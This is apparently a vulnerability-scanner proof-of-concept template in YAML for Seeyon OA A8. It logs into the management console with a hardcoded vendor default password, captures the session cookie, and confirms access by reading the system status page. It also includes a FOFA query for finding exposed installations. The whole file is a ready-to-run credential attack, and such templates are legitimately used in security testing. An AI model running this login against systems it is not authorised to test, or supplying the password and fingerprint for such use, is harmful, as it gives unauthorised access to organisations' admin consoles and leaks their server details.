id: poc-yaml-seeyon-a8-management-default-password
info:
  name: 致远OA management默认口令致信息泄露漏洞
  severity: high
  tags:
  - 弱口令
  finger: 致远OA
  fofa: app="致远互联-OA"
requests:
- method: POST
  path: /seeyon/management/index.jsp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: password=WLCCYBD%40SEEYON
  output:
  - regex_match(headers, "JSESSIONID=(?P<Cookie>.*?);")
  expression: "status_code == 302 && \nbody == \"\" &&\ncontains(headers,\"/seeyon/management/status.jsp\"\
    )\n"
- method: GET
  path: /seeyon/management/status.jsp
  headers:
    Cookie: JSESSIONID={{.Cookie}}
  expression: "status_code == 200 && \ncontains(body,\"OS Name\") &&\ncontains(body,\"\
    JVM Version\") &&\ncontains(body,\"Processors\")\n"
variables: {}
transport: http
